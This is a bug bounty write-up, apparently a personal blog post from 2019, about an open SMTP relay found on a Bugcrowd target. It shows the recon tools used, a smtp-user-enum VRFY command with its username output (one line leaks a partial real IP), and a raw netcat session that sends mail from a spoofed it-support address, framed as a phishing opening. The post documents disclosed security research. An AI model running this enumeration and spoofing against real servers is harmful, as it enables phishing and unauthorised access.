+++
title = "Just a write-up"
date = "2019-04-05"
author = ".!"
cover = "smtp_server.png"
description = "SMTP miscofiguration vulnerability"
draft = false
+++

Hey There guys This is my first write-up I've created this blog site but I'm not so regular :P but from now I might be post the blogs more regularly not promising though.

So today I'll share one of my finding in one public program on bugcrowd platform It was not so cool bug to find or look for but still it triaged P3, So I thought let's share this with you guys.

So as first basic approach to any target i've already completed by Recon step I had around 108 list of sub-domains, after doing sub-domain enumeration I took screenshots of all the subdomains using EyeWitness and I was going through all the Snaps, I found something suspicious there was one page which didn't had any content but just one string something like

> ## ChbfdtyhjYfjkh

That's it so I decided to start with this target first, So I fired up my masscan gave the appropriate parameters and scanned that sub-domain but before that I had done nslookup for that sub-domain so It gave me the IP Address of the server which I then putted in masscan, As a results It has around 4 ports open one of them was 25 which is SMTP, So I thought to test the SMTP-server.

After doing little research about SMTP vulnerabilities I tried to enumerate the users on the server using "smtp-user-enum tool" which came built-in into kali systems, Following is the command I used:

```sh
smtp-user-enum -M VRFY -U /usr/share/wordlists/fern-wifi/common.txt  -t xx.xxx.57.15
```

I'm using fern-wifi's commans users list to check for existing users and -t "xx.xxx.57.15" is my target, In the results I was able to enumerate all the existing users on the server, result was as followed 

```cmd

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/fern-wifi/common.txt
Target count ............. 1
Username count ........... 478
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Tue Mar  5 16:51:36 2019 #########
 exists57.15: acc
 exists57.15: abc123
 exists57.15: adfexc
 exists57.15: aaa
 exists57.15: access
 exists57.15: adm
 exists57.15: admin
 exists57.15: admin123
 exists57.15: admin_1
 exists57.15: admin2
 exists57.15: adminstrator
 exists57.15: administrator
 exists57.15: adminstat
 exists57.15: adminttd
 exists57.15: adminuser
 exists57.15: admn
 exists57.15: adminview
 exists57.15: adslolitec
 exists57.15: adslroot
 exists57.15: adtran
 exists57.15: ami
 exists57.15: anicust
 exists57.15: anonymous
 exists57.15: apc
 exists57.15: cac_admin
 exists57.15: browsepw
 exists57.15: cacadmin
 exists57.15: cascade
 exists57.15: calvin
 exists57.15: bluepw
 exists57.15: cablecom
 exists57.15: changeme
 exists57.15: changeme2
 exists57.15: ccrusr
 exists57.15: cgadmin
 exists57.15: cellit
 exists57.15: cisco
 exists57.15: citel
 exists57.15: client
 exists57.15: Root
 exists57.15: RSX
 exists57.15: ROOT500
 exists57.15: SECURITY
 exists57.15: SERVICE
 exists57.15: SESAME
 exists57.15: SKY_FOX
 exists57.15: SMDR
 exists57.15: SPOOLMAN
 exists57.15: SSA
 exists57.15: SUPER
 exists57.15: SUPERUSER
 exists57.15: SUPPORT
 exists57.15: SYS
 exists57.15: SYSADM
 exists57.15: SYSDBA
 exists57.15: SYSTEM
 exists57.15: Service
 exists57.15: Sharp

63.232.57.15: _Cisco exists
######## Scan completed at Tue Mar  5 16:53:12 2019 #########
477 results.

478 queries in 96 seconds (5.0 queries / sec)

```

I was be able to gather 478 active users on the server next step was trying to connect to the server and communicate with it so that i can carry out some operations 

so I ran Netcat command

```sh
nc -nvv target_ip
```

and boom.! I got connection back and was able to run any SMTP commands which I want This was the output:

```sh
nc -nvv target_ip
(UNKNOWN) [target_ip] 25 (smtp) open
220 something.cheetahmail.com ESMTP

HELO target.com
250 something.cheetahmail.com

MAIL FROM:it-support@target.com
250 ok

RCPT To:postmaster@cheetamail.com
250 ok

DATA
354 go ahead
test test test test test test test
.
250 ok 1551863013
```

There I was be able to send Email to anyone from their official email address, it is possible to send email from any address, so attacker could pick something trusted like administrator@ or it-support@ , etc. Then there is a higher chance unsuspecting employee would click malicious URL/executable in the email, So for post exploitations we required some Social engineering skills but yeah this is what I had found :P Told you not so cool like RCE or SQL injection hope I'll find it in near future but yet It's a bug so I reported.!




Here is the GIF for no reason:

<div style="width:100%;height:0;padding-bottom:104%;position:relative;"><iframe src="https://giphy.com/embed/de9SDw6PGRsubN1o3X" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/reaction-mood-de9SDw6PGRsubN1o3X">via GIPHY</a></p>

Ignore the mistakes if any! because this is my first write-up :P

*Note:- There's one Night-mode/Day-mode switch on this website use it:P.!


